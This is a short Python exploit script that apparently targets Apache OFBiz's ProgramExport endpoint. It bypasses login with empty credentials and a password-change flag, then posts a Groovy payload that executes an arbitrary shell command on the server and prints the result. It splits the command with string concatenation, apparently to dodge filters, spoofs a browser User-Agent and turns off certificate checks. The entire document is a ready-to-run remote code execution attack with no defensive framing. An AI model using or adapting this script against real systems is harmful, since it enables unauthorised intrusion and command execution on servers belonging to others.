import requests
from urllib.parse import quote

# User input for target address
target_address = input("Enter the target address (e.g., 127.0.0.1:8443): ")
url = f"https://{target_address}/webtools/control/ProgramExport?USERNAME=&PASSWORD=a&requirePasswordChange=Y"

# User input for 'mk'+'dir /tmp'+'/hack'
groovy_program = input("Enter the directory creation command: ")

# Concatenate with random separation
groovy_program = "'+'".join(groovy_program)

# URL encode the groovy_program parameter
encoded_groovy_program = quote(f"println(('{groovy_program}').execute().text)")

# User input for USERNAME

# Prepare the payload
payload = {
    "groovyProgram": encoded_groovy_program
}

# Set headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
}


try:
    response = requests.post(url, data=payload, headers=headers, verify=False)
    response.raise_for_status()  # Raise an error for bad responses (4xx or 5xx)
    print(response.text)
except requests.exceptions.RequestException as e:
    print(f"Error: {e}")
